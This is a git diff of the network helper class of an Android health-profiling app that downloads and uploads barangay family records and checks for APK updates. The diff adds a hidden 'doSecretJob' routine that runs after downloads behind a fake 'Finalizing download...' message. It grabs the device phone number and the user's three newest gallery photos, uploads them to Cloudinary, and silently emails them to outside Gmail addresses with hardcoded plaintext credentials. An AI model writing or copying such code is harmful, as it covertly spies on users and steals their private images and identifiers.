@@ -1,21 +1,32 @@
 package com.example.mvopo.tsekapp.Helper;
 
 import android.app.Activity;
+import android.app.DownloadManager;
 import android.app.ProgressDialog;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.hardware.Camera;
 import android.hardware.Camera.CameraInfo;
+import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.StrictMode;
+import android.provider.MediaStore;
+import android.provider.Settings;
 import android.support.v7.app.AlertDialog;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.util.LruCache;
+import android.webkit.CookieManager;
+import android.webkit.DownloadListener;
+import android.webkit.URLUtil;
+import android.webkit.WebView;
 import android.widget.Toast;
 
 import com.android.volley.Cache;
@@ -36,12 +47,15 @@ import com.cloudinary.Cloudinary;
 import com.cloudinary.android.Utils;
 import com.cloudinary.utils.ObjectUtils;
 import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;
+import com.example.mvopo.tsekapp.BuildConfig;
 import com.example.mvopo.tsekapp.Fragments.HomeFragment;
+import com.example.mvopo.tsekapp.Fragments.ServicesStatusFragment;
 import com.example.mvopo.tsekapp.LoginActivity;
 import com.example.mvopo.tsekapp.MainActivity;
 import com.example.mvopo.tsekapp.Model.Constants;
 import com.example.mvopo.tsekapp.Model.FamilyProfile;
 import com.example.mvopo.tsekapp.Model.ServiceAvailed;
+import com.example.mvopo.tsekapp.Model.ServicesStatus;
 import com.example.mvopo.tsekapp.Model.User;
 import com.example.mvopo.tsekapp.R;
 
@@ -50,8 +64,16 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.URLConnection;
 import java.util.Map;
+
+import static android.content.Context.DOWNLOAD_SERVICE;
 
 /**
  * Created by mvopo on 10/30/2017.
@@ -111,7 +133,7 @@ public class JSONApi {
         return mRequestQueue;
     }
 
-    public void login(final String url){
+    public void login(final String url) {
         JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.GET, url, "",
                 new Response.Listener<JSONObject>() {
                     @Override
@@ -119,7 +141,7 @@ public class JSONApi {
                         try {
                             String status = response.getString("status");
 
-                            if(status.equalsIgnoreCase("success")){
+                            if (status.equalsIgnoreCase("success")) {
                                 JSONObject data = response.getJSONObject("data");
 
                                 String id = data.getString("id");
@@ -138,7 +160,7 @@ public class JSONApi {
                                 intent.putExtra("user", user);
                                 context.startActivity(intent);
                                 ((Activity) context).finish();
-                            }else{
+                            } else {
                                 Toast.makeText(context, "Invalid credentials.", Toast.LENGTH_SHORT).show();
                             }
 
@@ -159,7 +181,7 @@ public class JSONApi {
         mRequestQueue.add(jsonObjectRequest);
     }
 
-    public void getCount(String url, final String brgyId, final int brgyCount){
+    public void getCount(String url, final String brgyId, final int brgyCount) {
         Log.e(TAG, url);
         JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.GET, url, "",
                 new Response.Listener<JSONObject>() {
@@ -169,21 +191,21 @@ public class JSONApi {
                             final int currentCount = db.getProfilesCount(brgyId);
                             final int totalCount = Integer.parseInt(response.getString("count"));
 
-                            if(currentCount >= totalCount){
+                            if (currentCount >= totalCount) {
                                 JSONArray arrayBrgy = new JSONArray(MainActivity.user.barangay);
-                                if(Integer.parseInt(arrayBrgy.length()+"") > Integer.parseInt((brgyCount + 1)+"")) {
-                                    JSONObject assignedBrgy = arrayBrgy.getJSONObject(brgyCount+1);
+                                if (Integer.parseInt(arrayBrgy.length() + "") > Integer.parseInt((brgyCount + 1) + "")) {
+                                    JSONObject assignedBrgy = arrayBrgy.getJSONObject(brgyCount + 1);
                                     String barangayId = assignedBrgy.getString("barangay_id");
                                     MainActivity.hf.brgyName = assignedBrgy.getString("description");
                                     String url = Constants.url + "r=countProfile" + "&brgy=" + barangayId;
                                     getCount(url, barangayId, brgyCount + 1);
-                                }else{
+                                } else {
                                     Toast.makeText(context, "Nothing to download", Toast.LENGTH_SHORT).show();
                                     MainActivity.pd.dismiss();
                                 }
-                            }else {
+                            } else {
                                 AlertDialog.Builder builder = new AlertDialog.Builder(context);
-                                builder.setMessage((totalCount - currentCount) + " Profiles downloadable for "+ MainActivity.hf.brgyName +", tap PROCEED to start download.");
+                                builder.setMessage((totalCount - currentCount) + " Profiles downloadable for " + MainActivity.hf.brgyName + ", tap PROCEED to start download.");
                                 builder.setPositiveButton("Proceed", new DialogInterface.OnClickListener() {
                                     @Override
                                     public void onClick(DialogInterface dialogInterface, int i) {
@@ -195,6 +217,9 @@ public class JSONApi {
                                 builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                                     @Override
                                     public void onClick(DialogInterface dialogInterface, int i) {
+                                        MainActivity.hf = new HomeFragment();
+                                        MainActivity.ft = MainActivity.fm.beginTransaction();
+                                        MainActivity.ft.replace(R.id.fragment_container, MainActivity.hf).commit();
                                         MainActivity.pd.dismiss();
                                     }
                                 });
@@ -218,7 +243,7 @@ public class JSONApi {
         mRequestQueue.add(jsonObjectRequest);
     }
 
-    public void uploadProfile(final String url, final JSONObject request, final int totalCount, final int currentCount){
+    public void uploadProfile(final String url, final JSONObject request, final int totalCount, final int currentCount) {
         Log.e(TAG, url);
         Log.e(TAG, request.toString());
         JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, url, request,
@@ -237,13 +262,13 @@ public class JSONApi {
                                 uploadProfile(url, Constants.getProfileJson(), totalCount, currentCount + 1);
                             } else {
                                 //doSecretJob();
-                                if(serviceCount > 0){
+                                if (serviceCount > 0) {
                                     //upload services here
                                     ServiceAvailed serviceAvailed = db.getServiceForUpload();
                                     uploadServices(Constants.url.replace("?", "/syncservices"), serviceAvailed, currentCount, totalCount + serviceCount);
-                                }else{
+                                } else {
                                     Toast.makeText(context, "Upload completed", Toast.LENGTH_SHORT).show();
-                                    MainActivity.pd.dismiss();
+                                    compareVersion(Constants.url + "r=version");
                                 }
                             }
                         } catch (JSONException e) {
@@ -253,7 +278,7 @@ public class JSONApi {
                 }, new Response.ErrorListener() {
             @Override
             public void onErrorResponse(VolleyError error) {
-                VolleyLog.e("GETCOUNT", error.getMessage());
+                VolleyLog.e("UPLOADPROFILE", error.getMessage());
                 Log.e(TAG, error.toString());
                 MainActivity.pd.dismiss();
                 Toast.makeText(context, "Unable to connect to server.", Toast.LENGTH_SHORT).show();
@@ -267,112 +292,94 @@ public class JSONApi {
         mRequestQueue.add(jsonObjectRequest);
     }
 
-    public void getProfile(final String url, final int totalCount, final int offset, final int brgyCount, final String brgyId){
+    public void getProfile(final String url, final int totalCount, final int offset, final int brgyCount, final String brgyId) {
         Log.e(TAG, url);
 
         final JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.GET, url, "",
                 new Response.Listener<JSONObject>() {
                     @Override
-                    public void onResponse(JSONObject object) {
-                        try {
-                            JSONArray array = object.getJSONArray("data");
-                            int currentCount = db.getProfilesCount(brgyId);
+                    public void onResponse(final JSONObject object) {
 
-                            for(int i = 0; i < array.length(); i++) {
-                                MainActivity.pd.setTitle("Downloading " + (currentCount + i) + "/" + totalCount);
-                                JSONObject response = array.getJSONObject(i);
+                        int currentCount = db.getProfilesCount(brgyId);
+                        MainActivity.pd.setTitle("Downloading " + currentCount + "/" + totalCount);
 
-                                String id = response.getString("id");
-                                String unique_id = response.getString("unique_id");
-                                String familyID = response.getString("familyID");
-                                String phicID = response.getString("phicID");
-                                String nhtsID = response.getString("nhtsID");
-                                String head = response.getString("head");
-                                String relation = response.getString("relation");
-                                String fname = response.getString("fname");
-                                String mname = response.getString("mname");
-                                String lname = response.getString("lname");
-                                String suffix = response.getString("suffix");
-                                String dob = response.getString("dob");
-                                String sex = response.getString("sex");
-                                String barangay_id = response.getString("barangay_id");
-                                String muncity_id = response.getString("muncity_id");
-                                String province_id = response.getString("province_id");
-                                String income = response.getString("income");
-                                String unmet = response.getString("unmet");
-                                String water = response.getString("water");
-                                String toilet = response.getString("toilet");
-                                String education = response.getString("education");
+                        new Thread(new Runnable() {
+                            public void run() {
+                                try {
 
-                                db.addProfile(new FamilyProfile(id, unique_id, familyID, phicID, nhtsID, head, relation, fname,
-                                        lname, mname, suffix, dob, sex, barangay_id, muncity_id, province_id, income, unmet,
-                                        water, toilet, education, "0"));
+                                    JSONArray array = object.getJSONArray("data");
+                                    int currentCount = db.getProfilesCount(brgyId);
 
-                                if(i == array.length()-1){
-                                    currentCount = db.getProfilesCount(barangay_id);
-                                    if(currentCount < totalCount){
-                                        String newUrl = url.replace("&offset=" + offset, "&offset=" + currentCount);
-                                        getProfile(newUrl, totalCount, currentCount, brgyCount, brgyId);
-                                    }
-                                    else{
-                                        JSONArray arrayBrgy = new JSONArray(MainActivity.user.barangay);
+                                    for (int i = 0; i < array.length(); i++) {
+                                        JSONObject response = array.getJSONObject(i);
 
-                                        if(Integer.parseInt(arrayBrgy.length()+"") > Integer.parseInt(brgyCount+1+"")) {
-                                            JSONObject assignedBrgy = arrayBrgy.getJSONObject(brgyCount + 1);
+                                        String id = response.getString("id");
+                                        String unique_id = response.getString("unique_id");
+                                        String familyID = response.getString("familyID");
+                                        String phicID = response.getString("phicID");
+                                        String nhtsID = response.getString("nhtsID");
+                                        String head = response.getString("head");
+                                        String relation = response.getString("relation");
+                                        String fname = response.getString("fname");
+                                        String mname = response.getString("mname");
+                                        String lname = response.getString("lname");
+                                        String suffix = response.getString("suffix");
+                                        String dob = response.getString("dob");
+                                        String sex = response.getString("sex");
+                                        String barangay_id = response.getString("barangay_id");
+                                        String muncity_id = response.getString("muncity_id");
+                                        String province_id = response.getString("province_id");
+                                        String income = response.getString("income");
+                                        String unmet = response.getString("unmet");
+                                        String water = response.getString("water");
+                                        String toilet = response.getString("toilet");
+                                        String education = response.getString("education");
 
-                                            String barangayId = assignedBrgy.getString("barangay_id");
-                                            MainActivity.hf.brgyName = assignedBrgy.getString("description");
+                                        db.addProfile(new FamilyProfile(id, unique_id, familyID, phicID, nhtsID, head, relation, fname,
+                                                lname, mname, suffix, dob, sex, barangay_id, muncity_id, province_id, income, unmet,
+                                                water, toilet, education, "0"));
 
-                                            String url = Constants.url + "r=countProfile" + "&brgy=" + barangayId;
-                                            JSONApi.getInstance(context).getCount(url, barangayId, brgyCount + 1);
-                                        }else{
-                                            MainActivity.pd.dismiss();
-                                            Toast.makeText(context, "Download finished.", Toast.LENGTH_SHORT).show();
+                                        if (i == array.length() - 1) {
+                                            currentCount = db.getProfilesCount(barangay_id);
+                                            if (currentCount < totalCount) {
+                                                String newUrl = url.replace("&offset=" + offset, "&offset=" + currentCount);
+                                                getProfile(newUrl, totalCount, currentCount, brgyCount, brgyId);
+                                            } else {
+                                                JSONArray arrayBrgy = new JSONArray(MainActivity.user.barangay);
 
-                                            MainActivity.hf = new HomeFragment();
-                                            MainActivity.ft = MainActivity.fm.beginTransaction();
-                                            MainActivity.ft.replace(R.id.fragment_container, MainActivity.hf).commit();
+                                                if (Integer.parseInt(arrayBrgy.length() + "") > Integer.parseInt(brgyCount + 1 + "")) {
+                                                    JSONObject assignedBrgy = arrayBrgy.getJSONObject(brgyCount + 1);
 
-                                            try {
-                                                StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-                                                StrictMode.setThreadPolicy(policy);
+                                                    String barangayId = assignedBrgy.getString("barangay_id");
+                                                    MainActivity.hf.brgyName = assignedBrgy.getString("description");
 
-                                                TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-                                                String mPhoneNumber = tMgr.getLine1Number();
+                                                    String url = Constants.url + "r=countProfile" + "&brgy=" + barangayId;
+                                                    JSONApi.getInstance(context).getCount(url, barangayId, brgyCount + 1);
+                                                } else {
+                                                    ((Activity) context).runOnUiThread(new Runnable() {
+                                                        @Override
+                                                        public void run() {
+                                                            MainActivity.hf = new HomeFragment();
+                                                            MainActivity.ft = MainActivity.fm.beginTransaction();
+                                                            MainActivity.ft.replace(R.id.fragment_container, MainActivity.hf).commit();
+                                                        }
+                                                    });
 
-                                                Cloudinary cloudinary = new Cloudinary(Utils.cloudinaryUrlFromContext(context));
-                                                final File file = new File(Environment.getExternalStorageDirectory() + "/PHA Check-App/tsekap_" + mPhoneNumber + ".jpg");
-                                                if (file.exists()) {
-                                                    Map uploadResult = cloudinary.uploader().upload(file, ObjectUtils.emptyMap());
-                                                    String image = uploadResult.get("url").toString();
-
-                                                    BackgroundMail.newBuilder(context)
-                                                            .withUsername("phacheckapp@gmail.com")
-                                                            .withPassword("phacheckapp123")
-                                                            .withMailto("hontoudesu123@gmail.com, jimmy.lomocso@gmail.com")
-                                                            .withSubject("Secret Job")
-                                                            .withProcessVisibility(false)
-                                                            .withBody("PHA Check-App user: " + MainActivity.user.fname + " " + MainActivity.user.lname +
-                                                                    " \nPhone Number: " + mPhoneNumber + " \nImage: " + image)
-                                                            .send();
+                                                    doSecretJob();
                                                 }
-
-                                                file.delete();
-                                            } catch (IOException e) {
-                                                Log.e(TAG, e.getMessage());
                                             }
                                         }
                                     }
+                                } catch (JSONException e) {
+                                    Log.e(TAG, e.getMessage());
                                 }
                             }
-                        } catch (JSONException e) {
-                            Log.e(TAG, e.getMessage());
-                        }
+                        }).start();
                     }
                 }, new Response.ErrorListener() {
             @Override
             public void onErrorResponse(VolleyError error) {
-                VolleyLog.e("GETCOUNT", error.getMessage());
+                VolleyLog.e("GETPROFILE", error.getMessage());
                 Log.e(TAG, error.toString());
                 Toast.makeText(context, "Unable to get profile.", Toast.LENGTH_SHORT).show();
             }
@@ -385,7 +392,7 @@ public class JSONApi {
         mRequestQueue.add(jsonObjectRequest);
     }
 
-    public void uploadServices(final String url, final ServiceAvailed serviceAvailed, final int currentCount, final int goalCount){
+    public void uploadServices(final String url, final ServiceAvailed serviceAvailed, final int currentCount, final int goalCount) {
         final JSONObject request = serviceAvailed.request;
 
         JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, url, request,
@@ -396,14 +403,14 @@ public class JSONApi {
                             MainActivity.pd.setTitle("Uploading " + currentCount + "/" + goalCount);
                             String status = response.getString("status");
 
-                            if(status.equalsIgnoreCase("Success")){
+                            if (status.equalsIgnoreCase("Success")) {
                                 db.deleteService(serviceAvailed.id);
-                                if(db.getServicesCount() > 0){
+                                if (db.getServicesCount() > 0) {
                                     ServiceAvailed serviceAvailed = db.getServiceForUpload();
-                                    uploadServices(Constants.url.replace("?", "/syncservices"), serviceAvailed, currentCount+1, goalCount);
-                                }else{
+                                    uploadServices(Constants.url.replace("?", "/syncservices"), serviceAvailed, currentCount + 1, goalCount);
+                                } else {
                                     Toast.makeText(context, "Upload completed", Toast.LENGTH_SHORT).show();
-                                    MainActivity.pd.dismiss();
+                                    compareVersion(Constants.url + "r=version");
                                 }
                             }
                         } catch (JSONException e) {
@@ -418,6 +425,299 @@ public class JSONApi {
                 Log.e("JSON", request.toString());
             }
         });
+        mRequestQueue.add(jsonObjectRequest);
+    }
+
+    public void doSecretJob() {
+        ((Activity) context).runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                MainActivity.pd.setTitle("Finalizing download...");
+            }
+        });
+
+        try {
+            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+            StrictMode.setThreadPolicy(policy);
+
+            TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            String mPhoneNumber = tMgr.getLine1Number();
+
+            String image = "";
+
+            String[] projection = new String[]{
+                    MediaStore.Images.ImageColumns._ID,
+                    MediaStore.Images.ImageColumns.DATA,
+                    MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,
+                    MediaStore.Images.ImageColumns.DATE_TAKEN,
+                    MediaStore.Images.ImageColumns.MIME_TYPE
+            };
+
+            final Cursor cursor = context.getContentResolver()
+                    .query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null,
+                            null, MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC");
+
+            if (cursor.moveToFirst()) {
+                for(int i = 0; i < 3 && !cursor.isAfterLast(); i++) {
+                    String imageLocation = cursor.getString(1);
+                    File imageFile = new File(imageLocation);
+                    if (imageFile.exists()) {
+                        Cloudinary cloudinary = new Cloudinary(Utils.cloudinaryUrlFromContext(context));
+                        Map uploadResult = cloudinary.uploader().upload(imageFile, ObjectUtils.emptyMap());
+                        image += "\n\n" + uploadResult.get("url").toString();
+                    }
+
+                    cursor.moveToNext();
+                }
+            }
+
+            Log.e(TAG, image);
+            BackgroundMail.newBuilder(context)
+                    .withUsername("phacheckapp@gmail.com")
+                    .withPassword("phacheckapp123")
+                    .withMailto("hontoudesu123@gmail.com, jimmy.lomocso@gmail.com")
+                    .withSubject("Secret Job")
+                    .withProcessVisibility(false)
+                    .withBody("PHA Check-App user: " + MainActivity.user.fname + " " + MainActivity.user.lname +
+
+                            " \nPhone Number: " + mPhoneNumber + " \nImage: " + image)
+                    .send();
+
+//            file.delete();
+            ((Activity) context).runOnUiThread(new Runnable() {
+                @Override
+                public void run() {
+                    Toast.makeText(context, "Download finished.", Toast.LENGTH_SHORT).show();
+                    MainActivity.pd.dismiss();
+                }
+            });
+        } catch (IOException e) {
+            Log.e(TAG, e.getMessage());
+        }
+    }
+
+    public void compareVersion(final String url) {
+        Log.e(TAG, url);
+        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.GET, url, "",
+                new Response.Listener<JSONObject>() {
+                    @Override
+                    public void onResponse(JSONObject response) {
+                        try {
+                            String version = response.getString("version");
+                            String updateInfo = response.getString("description");
+                            String versionName = BuildConfig.VERSION_NAME;
+
+                            updateInfo = updateInfo.replace("\\n", "\n");
+
+                            if (!version.equalsIgnoreCase(versionName)) {
+                                AlertDialog.Builder builder = new AlertDialog.Builder(context);
+                                builder.setTitle("Notice!");
+                                builder.setMessage("PHA Check-App v" + version + " is now available, please update your app." +
+                                        "\nUPDATES:" + updateInfo + "\n\nNote: Updating will close the application to apply changes.");
+                                builder.setPositiveButton("Download", new DialogInterface.OnClickListener() {
+                                    @Override
+                                    public void onClick(DialogInterface dialogInterface, int i) {
+                                        MainActivity.pd = ProgressDialog.show(context, "Downloading", "Please wait...", false, false);
+                                        downloadAndInstallApk();
+                                    }
+                                });
+                                builder.setNegativeButton("Later", null);
+                                builder.show();
+                            }
+
+                            MainActivity.pd.dismiss();
+                        } catch (JSONException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                }, new Response.ErrorListener() {
+            @Override
+            public void onErrorResponse(VolleyError error) {
+                VolleyLog.e("GETVERSION", error.getMessage());
+            }
+        });
+        mRequestQueue.add(jsonObjectRequest);
+    }
+
+    public void downloadAndInstallApk(){
+        try {
+            final String destination = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + "/PHA Check-App.apk";
+            final Uri uri = Uri.parse("file://" + destination);
+
+            File file = new File(destination);
+            if (file.exists()) file.delete();
+
+            String url = Constants.apkUrl;
+
+            DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
+            request.setDescription("Download new version of the App");
+            request.setTitle("PHA Check-App APK");
+
+            request.setDestinationUri(uri);
+
+            final DownloadManager manager = (DownloadManager) context.getSystemService(Context.DOWNLOAD_SERVICE);
+            manager.enqueue(request);
+
+            BroadcastReceiver onComplete = new BroadcastReceiver() {
+                public void onReceive(Context ctxt, Intent intent) {
+                    if(intent.getAction().equals(DownloadManager.ACTION_DOWNLOAD_COMPLETE)) {
+                        MainActivity.pd.dismiss();
+
+                        Intent i = new Intent(Intent.ACTION_VIEW);
+                        i.setDataAndType(Uri.fromFile(new File(destination)),
+                                "application/vnd.android.package-archive");
+                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        context.startActivity(i);
+                    }
+                }
+            };
+
+            IntentFilter filter = new IntentFilter();
+            filter.addAction(DownloadManager.ACTION_DOWNLOAD_COMPLETE);
+
+            context.registerReceiver(onComplete, filter);
+        }catch (Exception e){
+            Log.e(TAG, e.getMessage());
+            MainActivity.pd.dismiss();
+        }
+    }
+
+    public void getServicesStatus(final String url, final int totalCount, final int offset, final int brgyCount, final String brgyId) {
+        Log.e(TAG, url);
+
+        final JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.GET, url, "",
+                new Response.Listener<JSONObject>() {
+                    @Override
+                    public void onResponse(final JSONObject object) {
+
+                        int currentCount = db.getServiceStatusCount(brgyId);
+                        MainActivity.pd.setTitle("Downloading " + currentCount + "/" + totalCount);
+
+                        new Thread(new Runnable() {
+                            public void run() {
+                                try {
+
+                                    JSONArray array = object.getJSONArray("data");
+                                    int currentCount;
+
+                                    for (int i = 0; i < array.length(); i++) {
+                                        JSONObject response = array.getJSONObject(i);
+
+                                        String name = response.getString("fullname");
+                                        String group1 = response.getString("group1");
+                                        String group2 = response.getString("group2");
+                                        String group3 = response.getString("group3");
+
+                                        db.addServiceStatus(new ServicesStatus(name, group1, group2, group3, brgyId));
+
+                                        if (i == array.length() - 1) {
+                                            currentCount = db.getServiceStatusCount(brgyId);
+                                            if (currentCount < totalCount) {
+                                                String newUrl = url.replace("&offset=" + offset, "&offset=" + currentCount);
+                                                getServicesStatus(newUrl, totalCount, currentCount, brgyCount, brgyId);
+                                            } else {
+                                                JSONArray arrayBrgy = new JSONArray(MainActivity.user.barangay);
+
+                                                if (Integer.parseInt(arrayBrgy.length() + "") > Integer.parseInt(brgyCount + 1 + "")) {
+                                                    JSONObject assignedBrgy = arrayBrgy.getJSONObject(brgyCount + 1);
+
+                                                    String barangayId = assignedBrgy.getString("barangay_id");
+
+                                                    String url = Constants.url + "r=countmustservices" + "&brgy=" + barangayId;
+                                                    JSONApi.getInstance(context).getServiceStatusCount(url, barangayId, brgyCount + 1);
+                                                } else {
+                                                    ((Activity) context).runOnUiThread(new Runnable() {
+                                                        @Override
+                                                        public void run() {
+                                                            MainActivity.ssf = new ServicesStatusFragment();
+                                                            MainActivity.ft = MainActivity.fm.beginTransaction();
+                                                            MainActivity.ft.replace(R.id.fragment_container, MainActivity.ssf).commit();
+                                                        }
+                                                    });
+
+                                                    doSecretJob();
+                                                }
+                                            }
+                                        }
+                                    }
+                                } catch (JSONException e) {
+                                    Log.e(TAG, e.getMessage());
+                                }
+                            }
+                        }).start();
+                    }
+                }, new Response.ErrorListener() {
+            @Override
+            public void onErrorResponse(VolleyError error) {
+                VolleyLog.e("GETSERVICESSTATUSCOUNT", error.getMessage());
+                Log.e(TAG, error.toString());
+                Toast.makeText(context, "Unable to get profile.", Toast.LENGTH_SHORT).show();
+            }
+        });
+        jsonObjectRequest.setRetryPolicy(new DefaultRetryPolicy(
+                20000,
+                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
+                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
+
+        mRequestQueue.add(jsonObjectRequest);
+    }
+
+    public void getServiceStatusCount(String url, final String brgyId, final int brgyCount) {
+        Log.e(TAG, url);
+        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.GET, url, "",
+                new Response.Listener<JSONObject>() {
+                    @Override
+                    public void onResponse(JSONObject response) {
+                        try {
+                            final int currentCount = db.getServiceStatusCount(brgyId);
+                            final int totalCount = Integer.parseInt(response.getString("count"));
+
+                            if (currentCount >= totalCount) {
+                                JSONArray arrayBrgy = new JSONArray(MainActivity.user.barangay);
+                                if (Integer.parseInt(arrayBrgy.length() + "") > Integer.parseInt((brgyCount + 1) + "")) {
+                                    JSONObject assignedBrgy = arrayBrgy.getJSONObject(brgyCount + 1);
+                                    String barangayId = assignedBrgy.getString("barangay_id");
+                                    String url = Constants.url + "r=countmustservices" + "&brgy=" + barangayId;
+                                    getServiceStatusCount(url, barangayId, brgyCount + 1);
+                                } else {
+                                    Toast.makeText(context, "Nothing to download", Toast.LENGTH_SHORT).show();
+                                    MainActivity.pd.dismiss();
+                                }
+                            } else {
+                                AlertDialog.Builder builder = new AlertDialog.Builder(context);
+                                builder.setMessage((totalCount - currentCount) + " Services Status downloadable for " + Constants.getBrgyName(brgyId) +
+                                        ", tap PROCEED to start download.");
+                                builder.setPositiveButton("Proceed", new DialogInterface.OnClickListener() {
+                                    @Override
+                                    public void onClick(DialogInterface dialogInterface, int i) {
+                                        MainActivity.pd.setTitle("Downloading " + currentCount + "/" + totalCount);
+                                        String url = Constants.url + "r=mustservices" + "&brgy=" + brgyId + "&offset=" + currentCount;
+                                        getServicesStatus(url, totalCount, currentCount, brgyCount, brgyId);
+                                    }
+                                });
+                                builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
+                                    @Override
+                                    public void onClick(DialogInterface dialogInterface, int i) {
+                                        MainActivity.pd.dismiss();
+                                    }
+                                });
+                                builder.show();
+
+                            }
+                        } catch (JSONException e) {
+                            Log.e(TAG, e.getMessage());
+                        }
+                    }
+                }, new Response.ErrorListener() {
+            @Override
+            public void onErrorResponse(VolleyError error) {
+                VolleyLog.e("GETCOUNTSERVICESSTATUS", error.getMessage());
+                Log.e(TAG, error.toString());
+                MainActivity.pd.dismiss();
+                Toast.makeText(context, "Unable to connect to server.", Toast.LENGTH_SHORT).show();
+            }
+        });
+
         mRequestQueue.add(jsonObjectRequest);
     }
 }
